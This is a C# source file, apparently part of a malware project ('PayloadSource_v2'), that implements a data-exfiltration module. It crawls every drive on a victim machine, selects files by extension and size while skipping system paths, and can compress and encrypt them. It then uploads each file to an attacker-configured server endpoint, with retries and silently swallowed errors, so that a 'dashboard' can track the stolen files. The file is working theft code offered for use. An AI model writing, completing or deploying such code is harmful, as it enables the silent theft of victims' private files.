// =====================================================================
// EXFILTRATION MODULE - Vercel Dashboard Compatible
// =====================================================================
// Drop-in replacement for Exfiltration class in PayloadSource_v2.cs
// Adds X-File-Name header for dashboard file tracking

internal static class Exfiltration
{
    public static void Run()
    {
        if (!Config.ExfilEnabled) return;

        try
        {
            var files = CollectFiles();
            if (files.Count == 0) return;

            foreach (var file in files)
            {
                try { UploadFile(file); }
                catch { /* Continue on upload failure */ }
            }
        }
        catch { }
    }

    private static List<string> CollectFiles()
    {
        var result = new List<string>();
        long maxSize = (long)Config.ExfilMaxFileSizeMB * 1024 * 1024;
        int count = 0;

        foreach (var drive in DriveInfo.GetDrives())
        {
            if (!drive.IsReady) continue;
            if (count >= Config.ExfilMaxFiles) break;

            try
            {
                CollectFromDirectory(drive.Name, result, maxSize, ref count);
            }
            catch { }
        }

        return result;
    }

    private static void CollectFromDirectory(string path, List<string> result, long maxSize, ref int count)
    {
        if (count >= Config.ExfilMaxFiles) return;

        try
        {
            foreach (string file in Directory.EnumerateFiles(path))
            {
                if (count >= Config.ExfilMaxFiles) break;

                try
                {
                    string ext = Path.GetExtension(file);
                    
                    // Check skip extensions first
                    bool shouldSkip = false;
                    foreach (string skipExt in Config.ExfilSkipExtensions)
                    {
                        if (string.Equals(ext, skipExt, StringComparison.OrdinalIgnoreCase))
                        {
                            shouldSkip = true;
                            break;
                        }
                    }
                    if (shouldSkip) continue;

                    // Check target extensions
                    bool match = false;
                    foreach (string targetExt in Config.ExfilTargetExtensions)
                    {
                        if (string.Equals(ext, targetExt, StringComparison.OrdinalIgnoreCase))
                        {
                            match = true;
                            break;
                        }
                    }
                    if (!match) continue;

                    // Check file size
                    var fi = new FileInfo(file);
                    if (fi.Length > maxSize) continue;
                    if (fi.Length == 0) continue;

                    // Skip system files
                    if (ShouldSkipFile(file)) continue;

                    result.Add(file);
                    count++;
                }
                catch { }
            }

            foreach (string subDir in Directory.EnumerateDirectories(path))
            {
                if (count >= Config.ExfilMaxFiles) break;
                try
                {
                    new DirectoryInfo(subDir).Attributes &= ~FileAttributes.ReadOnly;
                    CollectFromDirectory(subDir, result, maxSize, ref count);
                }
                catch { }
            }
        }
        catch { }
    }

    private static bool ShouldSkipFile(string path)
    {
        string lower = path.ToLowerInvariant();
        string[] skip = { 
            "appdata\\local", "appdata\\locallow", "users\\all users", "programdata",
            "windows", "recycle.bin", "system volume information",
            "boot.ini", "bootfont.bin", "iconcache.db", "ntuser.dat", 
            "ntuser.dat.log", "ntuser.ini", "thumbs.db", "autorun.inf", 
            "bootsect.bak", "bootmgfw.efi", "desktop.ini", "pagefile.sys",
            "hiberfil.sys", "swapfile.sys"
        };
        foreach (string s in skip)
            if (lower.Contains(s)) return true;
        return false;
    }

    private static void UploadFile(string filePath)
    {
        for (int attempt = 0; attempt <= Config.ExfilRetryCount; attempt++)
        {
            try
            {
                byte[] fileData = File.ReadAllBytes(filePath);
                
                // Compress if enabled
                if (Config.ExfilCompress)
                {
                    fileData = Compress(fileData);
                }
                
                // Encrypt if enabled (use same hybrid encryption)
                if (Config.ExfilEncrypt && Config.UseHybridEncryption)
                {
                    string tempEnc = Path.Combine(Path.GetTempPath(), SecureRandom.RandomName(12) + ".enc");
                    Crypto.EncryptFile(filePath, tempEnc);
                    fileData = File.ReadAllBytes(tempEnc);
                    try { File.Delete(tempEnc); } catch { }
                }

                using (var client = new System.Net.Http.HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(Config.ExfilTimeoutSeconds);
                    
                    if (!string.IsNullOrEmpty(Config.ExfilApiKey))
                    {
                        client.DefaultRequestHeaders.Add("Authorization", "Bearer " + Config.ExfilApiKey);
                    }

                    var content = new System.Net.Http.ByteArrayContent(fileData);
                    content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                    
                    // Add filename header for dashboard tracking
                    string fileName = Path.GetFileName(filePath);
                    content.Headers.Add("X-File-Name", fileName);
                    
                    var requestUri = Config.ExfilServerUrl.TrimEnd('/') + "/api/exfil/upload";
                    
                    var response = client.PostAsync(requestUri, content).Result;
                    response.EnsureSuccessStatusCode();
                }
                
                break; // Success
            }
            catch
            {
                if (attempt < Config.ExfilRetryCount)
                {
                    Thread.Sleep(Config.ExfilRetryDelaySeconds * 1000);
                }
            }
        }
    }

    private static byte[] Compress(byte[] data)
    {
        using (var output = new MemoryStream())
        {
            using (var gzip = new System.IO.Compression.GZipStream(output, System.IO.Compression.CompressionLevel.Optimal))
            {
                gzip.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }
    }
}